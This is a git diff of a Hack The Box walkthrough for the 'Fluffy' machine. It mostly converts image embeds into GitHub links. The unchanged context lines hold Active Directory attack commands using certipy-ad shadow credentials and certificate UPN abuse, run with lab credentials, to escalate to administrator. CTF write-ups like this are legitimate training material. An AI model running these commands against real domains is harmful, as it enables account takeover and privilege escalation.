@@ -1,5 +1,6 @@
 
-![[Pasted image 20250727232856.png]]
+![Fluffy](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250727232856.png)
+
 
 ### Machine Information
 
@@ -155,7 +156,7 @@ smb: \> ls
 
 The interesting file here is the 'Upgrade_Notice.pdf' this file contains CVE information that is helpful in gaining access to the machine.
 
-![[Pasted image 20250728001245.png]]
+![Fluffy_CVE](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250728001245.png)
 
 
 ### CVE-2025-24071
@@ -265,15 +266,19 @@ Now we can run bloodhound to map out the AD environment. First, load up bloodhou
 ```
 
 Once the command has finished, we'll upload it in our bloodhound using our browser. Click the upload button and proceed to the directory where the json files are saved then upload them here. Once the ingestion was complete, we can now query in the explore section.
-![[2025-07-28_01-11.png]]
+<!--![[2025-07-28_01-11.png]]-->
+![Fluffy](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-11.png)
 
 
 
 'p.agila' can write itself in the Service Accounts.
-![[Pasted image 20250728010155.png]]
+<!--![[Pasted image 20250728010155.png]]-->
+![Fluffy](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250728010155.png)
+
 
 And Service Accounts has write permissions to 'CA_SVC'.
-![[Pasted image 20250728010333.png]]
+
+![Fluffy_Pasted image 20250728010333.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/Pasted%20image%2020250728010333.png)
 
 Since 'p.agila' can write itself in the Service Accounts, we'll run bloodyAD to do this.
 ```
@@ -286,7 +291,8 @@ After that, we'll run certipy-ad.
 faketime '2025-07-28 05:34:30'  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
 ```
 
-![[2025-07-28_01-24.png]]
+![Fluffy_2025-07-28_01-24.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-24.png)
+
 Command Explanation (Disclaimer: This is new to me so this explanation is from perplexity.ai):
 This command above does the following in one automated operation using Certipy's shadow credentials feature:
 
@@ -309,7 +315,8 @@ This attack exploits the **msDS-KeyCredentialLink** attribute on the target's 
 ### User Flag
 
 Now that we got the hash, we'll need to gain access to the machine via evil-winrm. Navigate to the Desktop and get the user flag.
-![[2025-07-28_01-27.png]]
+
+![Fluffy_2025-07-28_01-27.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-27.png)
 
 
 ### Privilege Escalation
@@ -428,7 +435,7 @@ What it does:
 
 ## 1. Requesting a Certificate
 
-![[2025-07-28_01-56.png]]
+![Fluffy_2025-07-28_01-56.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_01-56.png)
 
 ```bash
 faketime '2025-07-28 05:56:13' certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
@@ -457,7 +464,7 @@ faketime '2025-07-28 05:56:13' certipy-ad req -k -dc-ip '10.10.11.69' -target 'D
 
 ## 2. Updating the Account with a User Principal Name
 
-![[2025-07-28_02-00.png]]
+![Fluffy_2025-07-28_02-00.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_02-00.png)
 
 ```bash
 faketime '2025-07-28 06:02:49' certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
@@ -476,7 +483,7 @@ faketime '2025-07-28 06:02:49' certipy-ad account -u 'p.agila@fluffy.htb' -p 'pr
 
 ## 3. Authenticating Using the Certificate
 
-![[2025-07-28_02-02.png]]
+![Fluffy_2025-07-28_02-02.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_02-02.png)
 
 ```bash
 faketime '2025-07-28 06:09:47' certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
@@ -518,4 +525,4 @@ With this, you effectively gain strong authentication material for the administr
 
 Now that we got the administrator hash, we can now login as administrator and get the root flag in the Desktop.
 
-![[2025-07-28_02-03.png]]
+![Fluffy_2025-07-28_02-03.png](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Fluffy/Assets/2025-07-28_02-03.png)
